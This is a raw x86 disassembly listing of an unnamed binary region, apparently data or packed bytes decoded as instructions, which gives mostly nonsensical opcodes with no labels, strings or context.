  41a56d:	call   0x9d89:0x5b409d37
  41a574:	inc    ecx
  41a575:	outs   dx,DWORD PTR ds:[esi]
  41a576:	mov    ecx,0x5b3deb
  41a57b:	xchg   ebp,eax
  41a57c:	cmp    DWORD PTR [esi+ecx*4-0x33],edx
  41a580:	mov    DWORD PTR [ecx-0x5aff2103],ebx
  41a586:	add    cl,ch
  41a588:	cmp    eax,0x2dc554e4
  41a58d:	push   esp
  41a58e:	fidivr DWORD PTR [edx+0x1c]
  41a591:	out    0x4b,al
  41a593:	jmp    0x41a547
  41a595:	sub    BYTE PTR [ecx],0x55
  41a598:	push   ds
  41a599:	inc    ebx
  41a59a:	mov    ah,BYTE PTR ds:0x0
	...
  41a5c4:	add    BYTE PTR [eax],al
  41a5c6:	inc    edi
  41a5c7:	pop    ebx
  41a5c8:	cmp    ch,al
  41a5ca:	into   
  41a5cb:	pusha  
  41a5cc:	inc    ecx
  41a5cd:	sub    BYTE PTR ds:0xc5bb72b5,al
  41a5d3:	daa    
  41a5d4:	and    al,0xd5
  41a5d6:	les    eax,FWORD PTR [edi]
  41a5d8:	and    al,0x1
  41a5da:	gs mov ch,0xd
  41a5dd:	sbb    ebx,DWORD PTR gs:[eax+eax*1-0x17]
  41a5e2:	push   esp
  41a5e3:	aaa    
  41a5e4:	and    al,0xf9
  41a5e6:	mov    ds:0xb538511e,eax
  41a5eb:	test   eax,0x97045be8
  41a5f0:	std    
  41a5f1:	add    BYTE PTR [ebx+eiz*1+0x24],ch
  41a5f5:	adc    BYTE PTR [ebx+ebp*1+0x24],ch
  41a5f9:	sbb    BYTE PTR [esi+0x2d],al
  41a5fc:	xchg   esi,ecx
  41a5fe:	pop    esp
  41a5ff:	xchg   eax,ebp
  41a601:	lahf   
  41a602:	pop    ebp
  41a603:	nop
  41a604:	sti    
  41a605:	sub    ebp,DWORD PTR [edi-0x1c]
  41a608:	dec    esp
  41a609:	and    al,0xcb
  41a60b:	pop    ebp
  41a60c:	jmp    0xc4c246c9
  41a611:	dec    esi
  41a612:	js     0x41a596
  41a614:	xchg   DWORD PTR [ebx+edi*1+0x47],ebp
  41a618:	mov    ebp,0xc2e595fa
  41a61d:	sar    edi,0x6f
  41a620:	inc    ecx
  41a622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a623:	pop    eax
  41a624:	and    al,0x10
  41a626:	pushf  
  41a627:	mov    ah,0x76
  41a629:	push   es
	...
  41a652:	add    BYTE PTR [eax],al
  41a654:	push   ds
  41a655:	and    esp,DWORD PTR [eax+ebx*1]
  41a658:	cmp    al,0x25
  41a65a:	aaa    
  41a65b:	mov    cs,WORD PTR [ebx-0x15000268]
  41a661:	push   ebp
  41a662:	dec    edi
  41a663:	push   ecx
  41a664:	fsub   QWORD PTR [eax-0x6e929c18]
  41a66a:	sti    
  41a66b:	mov    ebx,DWORD PTR [ebx]
  41a66d:	cmp    edx,DWORD PTR [eax]
  41a66f:	mov    ebp,DWORD PTR [edi-0x1b]
  41a672:	inc    esp
  41a673:	and    al,0x4f
  41a675:	sub    dl,BYTE PTR [eax-0x75]
  41a678:	mov    eax,ds:0xfa5084
  41a67d:	xchg   ecx,eax
  41a67e:	xchg   eax,ecx
  41a680:	dec    esp
  41a681:	mov    ds:0x473b6c87,al
  41a686:	mov    eax,0x2ac1bdab
  41a68b:	imul   DWORD PTR [esi-0x513e351c]
  41a691:	jo     0x41a692
  41a693:	leave  
  41a694:	ds test edx,ecx
  41a697:	cmp    DWORD PTR [edx-0x62],esi
  41a69a:	adc    DWORD PTR [edx+0x4a],esi
  41a69d:	or     eax,0xb4a244d
  41a6a2:	dec    ebp
  41a6a3:	and    al,0x46
  41a6a5:	sti    
  41a6a6:	push   esp
  41a6a7:	and    al,0x4e
  41a6a9:	aaa    
  41a6aa:	jle    0x41a6ac
  41a6ac:	add    WORD PTR [ecx],0x39
  41a6b0:	mov    eax,0xc9fffd7d
  41a6b5:	mov    bh,0x19
  41a6b7:	mov    DWORD PTR [eax],eax
	...
  41a6e1:	add    BYTE PTR [eax-0x4600024b],bh
  41a6e7:	pop    esp
  41a6e8:	cld    
  41a6e9:	jbe    0x41a725
  41a6eb:	ins    DWORD PTR es:[edi],dx
  41a6ec:	cld    
  41a6ed:	jmp    0x803e042c
  41a6f2:	jns    0x41a675
  41a6f4:	imul   edi,edi,0x30ff6c99
  41a6fa:	xchg   ecx,eax
  41a6fb:	or     al,0x3
  41a6fd:	mov    DWORD PTR [edx+0x2b],ecx
  41a700:	mov    al,BYTE PTR [esi+0x17e5e]
  41a706:	cmp    eax,0x1a6c8249
  41a70b:	mov    dh,0x4
  41a70d:	je     0x41a75b
  41a70f:	pop    es
  41a710:	test   BYTE PTR ds:0xfdf347bb,0x59
  41a717:	lods   al,BYTE PTR ds:[esi]
  41a718:	or     al,0x87
  41a71a:	add    bl,BYTE PTR [esi+0x1c]
  41a71d:	xchg   edx,ebp
  41a71f:	gs adc al,0x89
  41a722:	cli    
  41a723:	pop    ebp
  41a724:	and    BYTE PTR [ecx-0x76eb976e],cl
  41a72a:	and    BYTE PTR [eax+0x1c],0x5d
  41a72e:	mov    BYTE PTR [edi-0x77],ch
  41a731:	push   eax
  41a732:	cmp    bh,bl
  41a734:	or     ebx,DWORD PTR [ecx-0x43]
  41a737:	pop    ebx
  41a738:	stos   DWORD PTR es:[edi],eax
  41a739:	adc    al,0xfc
  41a73b:	imul   esp,edi,0xffffff80
  41a73e:	sbb    dl,BYTE PTR [edx+ebp*2+0x78]
  41a742:	pop    edx
  41a743:	pop    ds
  41a744:	out    0x4d,eax
	...
  41a76e:	add    BYTE PTR [eax],al
  41a770:	(bad)  
  41a771:	mov    esp,?
  41a773:	or     ch,BYTE PTR [edi]
  41a775:	fwait
  41a776:	sbb    eax,0xa9540281
  41a77b:	sbb    al,0x3e
  41a77d:	loop   0x41a7a2
  41a77f:	and    BYTE PTR [esi-0x20],bh
  41a782:	daa    
  41a783:	outs   dx,DWORD PTR ds:[esi]
  41a784:	inc    esp
  41a785:	fisubr DWORD PTR [edi]
  41a787:	cmc    
  41a788:	push   0xfc3c2bda
  41a78d:	jae    0x41a776
  41a78f:	mov    BYTE PTR [edx],cl
  41a791:	aas    
  41a792:	stos   DWORD PTR es:[edi],eax
  41a793:	jle    0x41a80e
  41a795:	cmovge ecx,DWORD PTR [ecx+0x7ea33f12]
  41a79c:	mov    WORD PTR [edi],cs
  41a79e:	inc    ebp
  41a79f:	mov    eax,eax
  41a7a1:	outs   dx,DWORD PTR ds:[esi]
  41a7a2:	jmp    0x41a7a7
  41a7a4:	and    esi,DWORD PTR ds:[eax+0x7e]
  41a7a8:	pop    esi
  41a7a9:	pop    edi
  41a7aa:	out    0x3,eax
  41a7ac:	mov    ecx,0x79fff7e5
  41a7b1:	xchg   esi,eax
  41a7b2:	aas    
  41a7b3:	out    0x77,al
  41a7b5:	test   DWORD PTR [edx+0x31],edx
  41a7b8:	sub    DWORD PTR [esi],0x5ba9ade6
  41a7be:	mov    bh,0x42
  41a7c0:	lods   al,BYTE PTR ds:[esi]
  41a7c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7c3:	xor    BYTE PTR [ebx+0x66],bh
  41a7c6:	xchg   ebp,eax
  41a7c7:	mov    edx,0x4284649
  41a7cc:	jno    0x41a769
  41a7ce:	sbb    bh,BYTE PTR [ebp+0x180cd4b]
	...
  41a7fc:	add    BYTE PTR [eax],al
  41a7fe:	outs   dx,BYTE PTR ds:[esi]
  41a7ff:	sbb    al,0xe7
  41a801:	sar    dh,cl
  41a803:	dec    ecx
  41a804:	add    BYTE PTR [esi-0x154832c6],ch
  41a80a:	dec    ebp
  41a80b:	push   esi
  41a80c:	add    BYTE PTR [eax-0x1a402403],bh
  41a812:	dec    esi
  41a813:	mov    al,ds:0x963d907f
  41a818:	std    
  41a819:	jmp    0xa9c5468d
  41a81e:	cmp    bl,dl
  41a820:	mov    ecx,0x515b3df0
  41a825:	pusha  
  41a826:	xor    esp,edx
  41a828:	dec    esi
  41a829:	in     eax,0xbc
  41a82b:	cwde   
  41a82c:	sbb    BYTE PTR [ecx-0x16416a30],cl
  41a832:	cmp    al,0x5b
  41a834:	add    BYTE PTR [ebp+eiz*2-0x6a],ah
  41a838:	push   esp
  41a839:	pusha  
  41a83a:	dec    esp
  41a83b:	dec    esp
  41a83c:	shr    ah,0x3d
  41a83f:	pop    ebx
  41a840:	add    cl,ch
  41a842:	mov    dh,0x3d
  41a844:	lds    ebp,FWORD PTR [ebp-0x16026a60]
  41a84a:	cmp    eax,0x9129815b
  41a84f:	push   eax
  41a850:	add    ch,ah
  41a852:	cmp    eax,0xbc05725b
  41a857:	cwde   
  41a858:	add    ch,ah
  41a85a:	cmp    eax,0x7128815b
  41a85f:	inc    edx
  41a860:	stc    
  41a861:	je     0x41a863
	...
  41a88b:	add    BYTE PTR [ebx-0x1d],bh
  41a88e:	mov    ds,ebp
  41a890:	popa   
  41a891:	xchg   ebp,eax
  41a892:	std    
  41a893:	bound  ecx,QWORD PTR [ebx-0x24]
  41a896:	enter  0xd3e6,0xdc
  41a89a:	and    al,0xe5
  41a89c:	cmp    eax,0x4267875b
  41a8a1:	pop    ecx
  41a8a2:	add    cl,ch
  41a8a4:	mov    edx,0x230004f5
  41a8a9:	pop    ecx
  41a8aa:	add    BYTE PTR [ecx+0x45ba9],cl
  41a8b0:	pop    ss
  41a8b1:	sbb    BYTE PTR [edx],bh
  41a8b3:	mov    edi,DWORD PTR [ecx+0x73]
  41a8b6:	add    al,0x0
  41a8b8:	daa    
  41a8b9:	push   ss
  41a8ba:	xchg   esi,eax
  41a8bb:	adc    BYTE PTR [ebx],ah
  41a8bd:	pop    ecx
  41a8be:	add    BYTE PTR [ecx+0x47769],cl
  41a8c4:	out    0x16,eax
  41a8c6:	add    eax,0x1c432389
  41a8cb:	mov    esp,DWORD PTR [ebx]
  41a8cd:	inc    ebx
  41a8ce:	push   esp
  41a8cf:	mov    ch,bl
  41a8d1:	pop    edi
  41a8d2:	sahf   
  41a8d3:	adc    al,0xe3
  41a8d5:	pop    eax
  41a8d6:	add    BYTE PTR [ecx],al
  41a8d8:	mov    ecx,0xd700046f
  41a8dd:	push   eax
  41a8de:	test   DWORD PTR [ebx+esi*1+0x6f],edi
  41a8e2:	test   DWORD PTR [ebx+eax*2+0x67],edi
  41a8e6:	test   DWORD PTR [esi+0x5c9b],ebx
  41a8ec:	sub    esp,DWORD PTR cs:[eax+ebx*2]
	...
  41a918:	add    BYTE PTR [eax],al
  41a91a:	lods   al,BYTE PTR ds:[esi]
  41a91b:	popf   
  41a91c:	or     eax,DWORD PTR [esi+0x6054]
  41a922:	or     ah,ah
  41a924:	add    BYTE PTR [eax],al
  41a926:	xchg   edi,eax
  41a927:	pop    eax
  41a928:	xchg   DWORD PTR [ebx+esi*2+0x24],eax
  41a92c:	add    eax,0x4c8746d3
  41a932:	and    DWORD PTR [eax+0x3d],0xffffff89
  41a936:	fwait
  41a937:	cmp    al,0x18
  41a939:	test   BYTE PTR [esi],bl
  41a93b:	adc    ch,BYTE PTR [ecx]
  41a93d:	mov    esi,DWORD PTR [ebx-0x36749fc4]
  41a943:	addr16 add al,0x0
  41a946:	push   edi
  41a947:	jne    0x41a995
  41a949:	and    al,0x3e
  41a94b:	push   edx
  41a94c:	push   esi
  41a94d:	mov    eax,edx
  41a94f:	lea    eax,ds:0x58693e00
  41a955:	and    al,0x8e
  41a957:	jae    0x41a9d6
  41a959:	dec    esp
  41a95a:	pop    edx
  41a95b:	outs   dx,BYTE PTR ds:[esi]
  41a95c:	push   esi
  41a95d:	dec    edi
  41a95e:	sbb    edx,esi
  41a960:	xchg   ah,al
  41a962:	cs pop es
  41a964:	ror    DWORD PTR ds:0x96ec2,0x3e
  41a96b:	test   eax,0x6f5a244d
  41a970:	push   ss
  41a971:	mov    DWORD PTR [edx-0x5a],esp
  41a974:	inc    ebp
  41a975:	mov    DWORD PTR [edx+0x5287419e],edx
  41a97b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a97c:	sbb    eax,0x87
	...
  41a9a5:	add    BYTE PTR [eax],al
  41a9a7:	add    BYTE PTR [edx-0x62],dh
  41a9aa:	sbb    ecx,ebp
  41a9ac:	xor    DWORD PTR [ecx],ecx
  41a9ae:	inc    ebp
  41a9af:	and    al,0x72
  41a9b1:	or     DWORD PTR [edi+0x14],edi
  41a9b4:	cmp    al,BYTE PTR [edx-0x2e82d6ff]
  41a9ba:	push   esi
  41a9bb:	dec    edi
  41a9bc:	ret    
  41a9bd:	cmc    
  41a9be:	and    eax,0xbf090c34
  41a9c3:	call   0xfe33f285
  41a9c8:	(bad)
  41a9cb:	sub    al,0xbd
  41a9cd:	add    ecx,DWORD PTR ds:0x81bba
  41a9d4:	ds stc 
  41a9d6:	xchg   BYTE PTR [edx+eax*2],ah
  41a9d9:	add    BYTE PTR [ecx],0xc5
  41a9dc:	cli    
  41a9dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9de:	adc    eax,0x1823e00
  41a9e3:	aaa    
  41a9e4:	cli    
  41a9e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9e6:	sbb    DWORD PTR [ebx-0x24],esi
  41a9e9:	add    dl,dh
  41a9eb:	inc    DWORD PTR [eax+0x5b]
  41a9ee:	ins    DWORD PTR es:[edi],dx
  41a9ef:	push   esi
  41a9f0:	aas    
  41a9f1:	pop    ebx
  41a9f2:	out    0x2a,eax
  41a9f4:	cli    
  41a9f5:	ds vmlaunch 
  41a9f9:	and    ebp,edx
  41a9fb:	add    edi,DWORD PTR [esi]
  41a9fd:	out    0x2b,al
  41a9ff:	sub    BYTE PTR [esi+0x2a],cl
  41aa02:	adc    dl,cl
  41aa04:	(bad)  
  41aa05:	sub    esp,DWORD PTR [edx-0x3e]
  41aa08:	es jle 0x41a9be
  41aa0b:	icebp  
	...
  41aa34:	add    BYTE PTR [eax],al
  41aa36:	adc    esp,edi
  41aa38:	xor    ebp,DWORD PTR [eax]
  41aa3a:	inc    esi
  41aa3b:	sub    bh,BYTE PTR [eax]
  41aa3d:	jge    0x41aa2f
  41aa3f:	out    0xaf,al
  41aa41:	fdiv   QWORD PTR [edx+0x37f18e8a]
  41aa47:	sahf   
  41aa48:	idiv   BYTE PTR [esi+0x45]
  41aa4b:	pop    esi
  41aa4c:	out    0x3,eax
  41aa4e:	mov    bh,0x17
  41aa50:	retf   
  41aa51:	sub    edx,DWORD PTR ds:0x3e03e45b
  41aa57:	(bad)  
  41aa59:	test   bl,cl
  41aa5b:	pop    ebp
  41aa5c:	out    dx,al
  41aa5d:	xchg   DWORD PTR [ecx],edi
  41aa5f:	pop    esi
  41aa60:	out    0x3,eax
  41aa62:	jne    0x41aabf
  41aa64:	int3   
  41aa65:	add    edi,DWORD PTR [esi]
  41aa67:	(bad)  
  41aa69:	test   BYTE PTR [ebx-0x567811a2],ch
  41aa6f:	pop    ebp
  41aa70:	out    0x3,eax
  41aa72:	(bad)  
  41aa73:	das    
  41aa74:	add    ecx,DWORD PTR [edi+eax*8+0x17]
  41aa78:	retf   
  41aa79:	push   edi
  41aa7a:	mov    bh,0xe9
  41aa7c:	repz pop es
  41aa7e:	ds pop ebx
  41aa80:	ret    0xc1c4
  41aa83:	pop    ss
  41aa84:	ret    
  41aa85:	and    eax,DWORD PTR [esi]
  41aa87:	sub    esi,DWORD PTR [ebp+edi*1+0x69]
  41aa8b:	sub    ebp,DWORD PTR [ecx+0x17b555]
  41aa91:	int    0x19
  41aa93:	sub    ecx,DWORD PTR [ecx-0x5508de1]
  41aa99:	out    0x0,al
	...
  41aac3:	add    BYTE PTR [esi-0x1c],cl
  41aac6:	dec    esp
  41aac7:	add    eax,0xd4c4a22
  41aacc:	and    dh,0x41
  41aacf:	call   0xe565c288
  41aad4:	nop
  41aad5:	getsec 
  41aad7:	jb     0x41aae5
  41aad9:	sub    eax,0x16f5a789
  41aade:	cmc    
  41aadf:	scas   al,BYTE PTR es:[edi]
  41aae0:	push   cs
  41aae1:	in     al,0x4c
  41aae3:	int    0x7d
  41aae5:	fiadd  DWORD PTR [ebp+eax*8+0x59]
  41aae9:	in     al,0x44
  41aaeb:	int    0x81
  41aaed:	sub    ecx,DWORD PTR [edi+0x62]
  41aaf0:	inc    DWORD PTR [edx-0x701181d3]
  41aaf6:	mov    DWORD PTR ds:0xa1293716,ebp
  41aafc:	inc    edx
  41aafd:	call   0x5e38:0x7bbfb0b8
  41ab04:	in     al,0xa1
  41ab06:	cli    
  41ab07:	jb     0x41ab04
  41ab09:	shr    eax,1
  41ab0b:	test   BYTE PTR [edx-0x63],0xe9
  41ab0f:	sbb    DWORD PTR [ebx],esi
  41ab11:	pop    ds
  41ab12:	and    al,0x15
  41ab14:	or     eax,0xa451cee4
  41ab19:	xchg   ch,bh
  41ab1b:	sbb    ah,BYTE PTR ss:[edi]
  41ab1e:	and    al,0xa5
  41ab20:	adc    dh,BYTE PTR [ebx+0x1b61ad89]
  41ab26:	push   edx
  41ab27:	mov    ecx,0x0
	...
  41ab50:	add    BYTE PTR [eax],al
  41ab52:	add    ah,BYTE PTR [ecx-0x7088e018]
  41ab58:	std    
  41ab59:	ret    0xe385
  41ab5c:	rol    DWORD PTR [eax],0xec
  41ab5f:	and    DWORD PTR [eax+ebx*2],esp
  41ab62:	(bad)  
  41ab64:	loop   0x41ab69
  41ab66:	fs xchg edi,eax
  41ab68:	mov    ebp,0x445665f8
  41ab6d:	and    al,0x1b
  41ab6f:	inc    esi
  41ab70:	call   0x44d9faf2
  41ab75:	and    al,0x3b
  41ab77:	pop    eax
  41ab78:	add    BYTE PTR [eax],al
  41ab7a:	daa    
  41ab7b:	in     al,0xfb
  41ab7d:	jbe    0x41abbe
  41ab7f:	ds ins BYTE PTR es:[edi],dx
  41ab81:	and    al,0x5b
  41ab83:	or     esi,DWORD PTR [eax]
  41ab85:	mov    esp,DWORD PTR [ebx+0x43]
  41ab88:	sub    BYTE PTR [ebp+0x36],dl
  41ab8b:	adc    al,0xce
  41ab8d:	call   0x3d3533
  41ab92:	mov    WORD PTR [ebx],?
  41ab94:	and    al,0x44
  41ab96:	pop    esp
  41ab97:	lahf   
  41ab98:	xchg   DWORD PTR [ebx+edi*8+0x1c],eax
  41ab9c:	push   edx
  41ab9d:	push   eax
  41ab9e:	ins    BYTE PTR es:[edi],dx
  41ab9f:	shr    eax,1
  41aba1:	stos   DWORD PTR es:[edi],eax
  41aba2:	imul   eax,DWORD PTR [eax+0x14a43bfb],0xa2f245c
  41abac:	or     bh,al
  41abae:	fwait
  41abaf:	cmp    BYTE PTR [ecx+eax*1],dl
  41abb2:	xlat   BYTE PTR ds:[ebx]
  41abb3:	pop    esp
  41abb4:	add    BYTE PTR [ebp+0x0],al
	...
  41abde:	add    BYTE PTR [eax],al
  41abe0:	adc    BYTE PTR [edx],dl
  41abe2:	dec    ecx
  41abe3:	cmp    ebx,esi
  41abe5:	cmp    BYTE PTR [ebp+edi*2-0x28],al
  41abe9:	adc    eax,0x5c9b148e
  41abee:	add    BYTE PTR [edx-0x5a],ch
  41abf1:	sub    eax,0xaf318b4d
  41abf6:	fwait
  41abf7:	repz pusha 
  41abf9:	add    BYTE PTR [edi-0x78e784ac],0xd8
  41ac00:	ds std 
  41ac02:	inc    edi
  41ac03:	and    al,0xfe
  41ac05:	rcl    DWORD PTR [ecx-0x77],cl
  41ac08:	js     0x41ac74
  41ac0a:	pop    edi
  41ac0b:	mul    BYTE PTR [ecx-0x6f]
  41ac0e:	jp     0x41ac5c
  41ac10:	and    bl,BYTE PTR [edx+0x70c54f58]
  41ac16:	jg     0x41ac74
  41ac18:	es sbb ecx,0x5c
  41ac1c:	dec    eax
  41ac1d:	mov    cl,0xee
  41ac1f:	cmp    DWORD PTR [esi],edx
  41ac21:	std    
  41ac22:	dec    esp
  41ac23:	and    al,0x96
  41ac25:	and    dl,bh
  41ac27:	les    eax,FWORD PTR [edx+0x3e00185e]
  41ac2d:	add    BYTE PTR [ecx],0xe9
  41ac30:	inc    ebp
  41ac31:	add    eax,0x822a246d
  41ac36:	inc    BYTE PTR [edx+0x184f8]
  41ac3c:	mov    ebp,0xc80cffee
  41ac41:	sbb    al,0x4
	...
  41ac6b:	add    BYTE PTR [eax],al
  41ac6d:	add    BYTE PTR [esi],bh
  41ac6f:	std    
  41ac70:	push   esp
  41ac71:	and    al,0x1e
  41ac73:	or     eax,0x823a1483
  41ac78:	add    DWORD PTR [ecx-0x7eb0f804],eax
  41ac7e:	std    
  41ac7f:	adc    DWORD PTR [edx-0x7f],0xfffffffe
  41ac83:	adc    DWORD PTR [ecx-0x75],0x72
  41ac87:	push   esi
  41ac88:	xor    BYTE PTR [edi-0x3b],cl
  41ac8b:	aaa    
  41ac8c:	fst    DWORD PTR [eax-0x7611df49]
  41ac92:	add    bl,BYTE PTR [esi+0x34]
  41ac95:	cmp    edx,edi
  41ac97:	push   ebp
  41ac98:	sbb    al,0x89
  41ac9a:	repnz pop ebp
  41ac9c:	cmp    BYTE PTR [edx-0x3b],dl
  41ac9f:	outs   dx,DWORD PTR ds:[esi]
  41aca0:	push   ecx
  41aca1:	jl     0x41ad00
  41aca3:	pop    ebx
  41aca4:	(bad)  
  41aca6:	lea    ecx,[edi-0x1c6985e2]
  41acac:	stos   DWORD PTR es:[edi],eax
  41acad:	daa    
  41acae:	es es mov bh,0x7a
  41acb2:	js     0x41ac36
  41acb4:	adc    eax,0xd28f63f8
  41acb9:	ret    0xdbb1
  41acbc:	or     DWORD PTR [edx],eax
  41acbe:	aas    
  41acbf:	popf   
  41acc0:	bound  edi,QWORD PTR [ebx-0x27166e77]
  41acc6:	adc    al,0x83
  41acc8:	shl    edi,0x3b
  41accb:	(bad)  
  41accc:	(bad)  
  41accd:	int3   
  41acce:	(bad)  
  41accf:	pop    ss
  41acd0:	add    ebx,DWORD PTR [eax+eax*1]
	...
  41acfb:	add    BYTE PTR [ebp+0x16be722b],cl
  41ad01:	mov    ds:0xe31bedb4,eax
  41ad06:	lahf   
  41ad07:	sbb    DWORD PTR [edi],eax
  41ad09:	pop    ebx
  41ad0a:	mov    al,ds:0x72ba21ac
  41ad0f:	push   ds
  41ad10:	or     eax,DWORD PTR [ebp-0x5e381548]
  41ad16:	test   al,0xdb
  41ad18:	push   ebx
  41ad19:	pop    edx
  41ad1a:	mov    eax,ds:0xbb378279
  41ad1f:	add    dh,dh
  41ad21:	push   edx
  41ad22:	nop
  41ad23:	outs   dx,DWORD PTR ds:[esi]
  41ad24:	inc    esi
  41ad25:	xchg   esi,eax
  41ad26:	sub    ebp,DWORD PTR [eax]
  41ad28:	sub    bl,BYTE PTR [edi+eiz*8+0x3]
  41ad2c:	fsub   DWORD PTR ds:[esi+0x76]
  41ad30:	push   ss
  41ad31:	push   edx
  41ad32:	and    al,0x70
  41ad34:	(bad)  
  41ad36:	mov    ebx,0xb92b6e27
  41ad3b:	js     0x41adb5
  41ad3d:	xor    DWORD PTR [ebp-0x9],0xffffffa3
  41ad41:	mov    ?,WORD PTR [edx-0x34]
  41ad44:	(bad)  
  41ad45:	pop    ss
  41ad46:	add    BYTE PTR ds:0x62502a32,cl
  41ad4c:	enter  0x7d83,0x1c
  41ad50:	xchg   ebx,eax
  41ad51:	nop
  41ad52:	cmp    DWORD PTR [ecx+0x7b],eax
  41ad55:	loop   0x41ad59
  41ad57:	jmp    0x6721:0x8d815b3d
  41ad5e:	add    dh,dh
	...
  41ad88:	add    BYTE PTR [eax],al
  41ad8a:	mov    eax,0x3de90288
  41ad8f:	fdiv   st(3),st
  41ad91:	jmp    0x5b3d:0xe9d4e052
  41ad98:	mov    DWORD PTR ds:0x35893b16,esi
  41ad9e:	xor    cx,WORD PTR [ecx+0x57496f]
  41ada5:	jmp    0x193d7b68
  41adaa:	mov    edi,0xbf1b0198
  41adaf:	call   0xed24:0x1f911901
  41adb6:	ins    BYTE PTR es:[edi],dx
  41adb7:	in     al,0xce
  41adb9:	xchg   ecx,eax
  41adba:	aam    0x92
  41adbc:	std    
  41adbd:	sahf   
  41adbe:	jbe    0x41add7
  41adc0:	and    al,0xd9
  41adc2:	jbe    0x41adeb
  41adc4:	and    al,0xd5
  41adc6:	data16 das 
  41adc8:	and    al,0xd1
  41adca:	push   ss
  41adcb:	pushf  
  41adcc:	push   edx
  41adcd:	jb     0x41ad6a
  41adcf:	sub    bh,BYTE PTR [esp+ecx*8-0xb]
  41add3:	rep outs dx,BYTE PTR ss:[esi]
  41add6:	fisubr DWORD PTR [ecx]
  41add8:	push   ecx
  41add9:	jb     0x41ad5e
  41addb:	aad    0x44
  41addd:	add    eax,0x5c15835e
  41ade2:	mov    ds:0x619d898f,al
  41ade7:	aaa    
  41ade8:	sub    DWORD PTR [eax],eax
  41adea:	push   esi
  41adeb:	loope  0x41ae6c
  41aded:	loop   0x41adef
	...
  41ae17:	add    BYTE PTR [edx+ebx*2-0x66a0743e],ah
  41ae1e:	cmc    
  41ae1f:	add    bh,ah
  41ae21:	ins    DWORD PTR es:[edi],dx
  41ae22:	call   0xfbc0d226
  41ae27:	push   ebp
  41ae28:	mov    ah,0x12
  41ae2a:	into   
  41ae2b:	mov    DWORD PTR [ebx+0x45e82c35],esp
  41ae31:	xchg   bl,bh
  41ae33:	(bad)  
  41ae34:	in     al,dx
  41ae35:	rol    DWORD PTR [edi+0x27358344],1
  41ae3b:	enter  0xd064,0xb8
  41ae3f:	jmp    0xf76fc139
  41ae44:	outs   dx,BYTE PTR ds:[esi]
  41ae45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae46:	cli    
  41ae47:	mov    ebp,ebp
  41ae49:	xchg   esi,eax
  41ae4a:	in     eax,0x1f
  41ae4c:	and    al,0xcf
  41ae4e:	xchg   DWORD PTR [ebx+eax*2+0x4b],eax
  41ae52:	inc    edi
  41ae54:	cmp    al,0xae
  41ae56:	jns    0x41ae60
  41ae58:	loopne 0x41ae75
  41ae5a:	and    al,0x14
  41ae5c:	es pop ecx
  41ae5e:	add    BYTE PTR [eax],al
  41ae60:	mov    ds:0x1c287680,al
  41ae65:	pushf  
  41ae66:	jl     0x41ae8c
  41ae68:	ins    BYTE PTR es:[edi],dx
  41ae69:	sub    esp,DWORD PTR [eax+esi*1]
  41ae6c:	aaa    
  41ae6d:	and    eax,0xc6bfce87
  41ae72:	hlt    
  41ae73:	(bad)  
  41ae74:	mov    eax,0x238bd80c
  41ae79:	cmp    ebp,DWORD PTR [eax]
  41ae7b:	push   ebp
	...
  41aea4:	add    BYTE PTR [eax],al
  41aea6:	aaa    
  41aea7:	or     al,0xce
  41aea9:	call   0x3d3a23
  41aeae:	sbb    al,0x9f
  41aeb0:	or     ecx,DWORD PTR [edx+eax*2+0x3e000055]
  41aeb7:	add    DWORD PTR [eax+0x24],ebp
  41aeba:	push   edx
  41aebb:	cmp    dl,0x82
  41aebe:	inc    esp
  41aebf:	add    BYTE PTR [ecx],0x0
  41aec2:	(bad)
  41aec5:	pop    eax
  41aec6:	mov    ebx,0x1583f945
  41aecb:	add    DWORD PTR [ecx],0x0
  41aece:	mov    ebp,0xc00d0335
  41aed3:	rol    BYTE PTR [eax+eax*1],cl
  41aed6:	ds stc 
  41aed8:	dec    edi
  41aed9:	and    al,0x12
  41aedb:	stc    
  41aedc:	mov    eax,0x77529
  41aee1:	or     dl,BYTE PTR ds:0xc5027235
  41aee7:	cmp    eax,0x96028954
  41aeec:	or     eax,0x54516129
  41aef1:	mov    ecx,DWORD PTR [edx-0x3ab0d7aa]
  41aef7:	mov    bl,0x7c
  41aef9:	pop    esp
  41aefa:	bound  edx,QWORD PTR [esi-0x24]
  41aefd:	int3   
  41aefe:	sub    DWORD PTR [ebp+0x569a37ea],edx
  41af04:	xor    BYTE PTR [edx+0x4a],dh
  41af07:	stc    
  41af08:	dec    esp
  41af09:	and    al,0x0
	...
  41af33:	add    BYTE PTR [esi+0x65],cl
  41af36:	push   esi
  41af37:	mov    eax,esi
  41af39:	jmp    0xed3ba366
  41af3e:	jle    0x41af18
  41af40:	lds    edi,FWORD PTR ds:0x52913820
  41af46:	jge    0x41af16
  41af48:	(bad)  
  41af49:	mov    ds:0x98d9fded,eax
  41af4e:	(bad)  
  41af4f:	mov    DWORD PTR [edx-0x62],esi
  41af52:	or     eax,0x34f92e7e
  41af57:	and    al,0xe
  41af59:	pop    ebx
  41af5a:	jb     0x41afab
  41af5c:	bound  eax,QWORD PTR [edi+0x70]
  41af5f:	aaa    
  41af60:	pop    edx
  41af61:	push   ebx
  41af62:	pusha  
  41af63:	dec    edi
  41af64:	bound  ecx,QWORD PTR [edi+0x62]
  41af67:	aas    
  41af68:	pop    edx
  41af69:	imul   ebx,DWORD PTR [esi+0x2ddfee56],0xffffffdb
  41af70:	pop    ebx
  41af71:	mov    dh,BYTE PTR [esi]
  41af73:	jmp    0x29eb:0x2c031eb7
  41af7a:	jb     0x41af35
  41af7c:	(bad)  
  41af7d:	mov    dl,0xf
  41af7f:	in     al,dx
  41af80:	outs   dx,DWORD PTR ds:[esi]
  41af81:	mov    edx,DWORD PTR [esi]
  41af83:	cs jg  0x41afe1
  41af86:	pop    esp
  41af87:	mov    ds:0x7ee75b3e,al
  41af8c:	cli    
  41af8d:	ss iret 
  41af8f:	cs mov al,0x36
  41af92:	jmp    0x41af97
  41af94:	ds push es
  41af96:	(bad)  
  41af97:	jle    0x41af99
	...
  41afc1:	add    dl,ch
  41afc3:	ss sti 
  41afc5:	jl     0x41af49
  41afc7:	aas    
  41afc8:	not    DWORD PTR [eax-0x74]
  41afcb:	sub    esp,DWORD PTR [edx-0x46]
  41afce:	push   ss
